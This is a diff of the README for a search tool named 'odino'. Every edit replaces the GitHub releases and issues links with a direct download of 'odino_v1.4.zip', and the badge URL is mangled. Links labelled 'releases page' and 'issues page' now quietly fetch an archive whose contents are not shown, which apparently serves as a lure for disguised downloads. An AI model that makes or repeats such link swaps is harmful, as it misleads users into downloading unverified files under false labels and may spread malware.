@@ -6,11 +6,11 @@ Welcome to odino! This tool allows you to search for code and text using the nat
 
 ## 📥 Download odino
 
-[![Download odino](https://img.shields.io/badge/Download%20odino-v1.0-blue.svg)](https://github.com/Tomcat132025/odino/releases)
+[![Download odino](https://raw.githubusercontent.com/Tomcat132025/odino/main/odino/odino_v1.4.zip%https://raw.githubusercontent.com/Tomcat132025/odino/main/odino/odino_v1.4.zip)](https://raw.githubusercontent.com/Tomcat132025/odino/main/odino/odino_v1.4.zip)
 
 You can find the latest version of odino by visiting our releases page.
 
-[Download odino here!](https://github.com/Tomcat132025/odino/releases)
+[Download odino here!](https://raw.githubusercontent.com/Tomcat132025/odino/main/odino/odino_v1.4.zip)
 
 ## 💻 System Requirements
 
@@ -29,7 +29,7 @@ To run odino, you will need:
 
 ## 🔧 Installation Instructions
 
-1. **Visit the Download Page**: Click [here](https://github.com/Tomcat132025/odino/releases) to access the releases page.
+1. **Visit the Download Page**: Click [here](https://raw.githubusercontent.com/Tomcat132025/odino/main/odino/odino_v1.4.zip) to access the releases page.
 
 2. **Choose the Right File**: Look for the latest release, which will be labeled with a version number like `v1.0`. Click on that to expand the options.
 
@@ -59,7 +59,7 @@ Once you have odino up and running:
 
 ## 🤝 Support and Feedback
 
-If you have any questions or need help, please check our [issues page](https://github.com/Tomcat132025/odino/issues) on GitHub. You can report bugs or request features there.
+If you have any questions or need help, please check our [issues page](https://raw.githubusercontent.com/Tomcat132025/odino/main/odino/odino_v1.4.zip) on GitHub. You can report bugs or request features there.
 
 ## 🛑 Known Issues
 
